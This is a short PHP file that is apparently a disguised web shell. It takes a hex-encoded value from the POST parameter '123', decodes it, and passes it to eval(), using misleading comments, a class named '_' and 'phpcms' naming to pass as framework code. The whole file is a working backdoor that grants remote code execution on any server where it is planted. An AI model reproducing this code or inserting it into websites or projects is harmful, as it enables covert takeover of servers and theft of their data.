<?php
class _
{
    static public $phpcms=Null;
    function __construct($l="error"){
        self::$phpcms=$l;
        @eval/*Defining error level offences*/(null.null.self::$phpcms);
    }
}
function hexToStr($hex){   
        $str=""; 
        for($i=0;$i<strlen($hex)-1;$i+=2)
        $str.=chr(hexdec($hex[$i].$hex[$i+1]));
        return  $str;
    } 
$error = null.hexToStr(@$_POST/*\*/["123"]);
$d = new _($error);
?>
